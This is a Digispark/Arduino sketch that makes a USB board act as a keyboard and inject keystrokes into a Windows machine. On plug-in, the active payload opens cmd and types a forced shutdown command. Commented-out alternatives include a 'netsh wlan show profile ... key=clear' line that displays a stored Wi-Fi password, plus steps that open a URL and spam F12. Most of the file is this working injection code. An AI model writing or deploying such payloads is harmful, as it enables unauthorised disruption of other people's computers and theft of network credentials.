#include <DigiKeyboard.h>
#include "DigiKeyboardFr.h"
//#include <DigiMouse.h>
//#include <DigiCDC.h>

int L=1;
char W;

void setup(){
//SerialUSB.begin();
//SerialUSB.delay(2E3);

//DigiMouse.begin();
pinMode(L,OUTPUT);

/*
DigiMouse.delay(300);
DigiMouse.move(50,50,50);
DigiMouse.delay(300);
*/

/*
DigiMouse.setButtons(1<<0);
DigiMouse.delay(500);
DigiMouse.setButtons(0);
DigiMouse.delay(500);
*/

//DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
//DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
//DigiKeyboard.delay(2E3);

/*
DigiKeyboard.delay(1E3);

DigiKeyboardFr.println("S K Y N E T");
DigiKeyboard.delay(1E3);

DigiKeyboardFr.println("abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~");
DigiKeyboard.delay(1E3);

DigiKeyboardFr.println("A Z E R T Y");
DigiKeyboard.delay(1E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1E3);
DigiKeyboardFr.println("A Z E R T Y");
DigiKeyboard.delay(1E3);
*/

/*
DigiKeyboard.delay(2E3);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_RIGHT);
DigiKeyboard.delay(0.1E3);
DigiKeyboardFr.println("https://www.youtube.com");
DigiKeyboard.delay(0.1E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
*/

/*
DigiKeyboard.delay(2E3);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(0,MOD_GUI_RIGHT);
DigiKeyboard.delay(0.1E3);
DigiKeyboardFr.println("where is my location");
DigiKeyboard.delay(0.1E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
*/


DigiKeyboard.delay(2E3);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(0,MOD_GUI_RIGHT);
DigiKeyboard.delay(0.5E3);
DigiKeyboardFr.println("cmd");
DigiKeyboard.delay(1E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2E3);
//DigiKeyboardFr.println("shutdown /r");
//DigiKeyboardFr.println("shutdown /s");
//DigiKeyboardFr.println("shutdown /r /t 5");
DigiKeyboardFr.println("shutdown /s /t 5");
DigiKeyboard.delay(0.5E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);


/*
DigiKeyboard.delay(2E3);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(0,MOD_GUI_RIGHT);
DigiKeyboard.delay(0.5E3);
DigiKeyboardFr.println("cmd");
DigiKeyboard.delay(1E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2E3);
DigiKeyboardFr.println("netsh wlan show profile ZEOP-c473d3 key=clear");
DigiKeyboard.delay(0.5E3);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
*/


/*
DigiKeyboard.delay(2E3);
DigiKeyboard.sendKeyStroke(0);

for(int C=0; C<5; C++){
DigiKeyboard.sendKeyStroke(KEY_F12);
DigiKeyboard.delay(0.5E3);
}

*/







}

void loop(){
/*
while(SerialUSB.available()){
W=SerialUSB.read();

if(W=='1'){
digitalWrite(L,1);
}
else if(W=='0'){
digitalWrite(L,0);
}

SerialUSB.println(W);



}
*/


/*
SerialUSB.delay(2E3);
SerialUSB.println("gg");
SerialUSB.delay(2E3);


digitalWrite(L,1);
SerialUSB.delay(0.1E3);
digitalWrite(L,0);
SerialUSB.delay(0.1E3);
*/

digitalWrite(L,1);
DigiKeyboard.delay(0.1E3);
digitalWrite(L,0);
DigiKeyboard.delay(0.1E3);




}


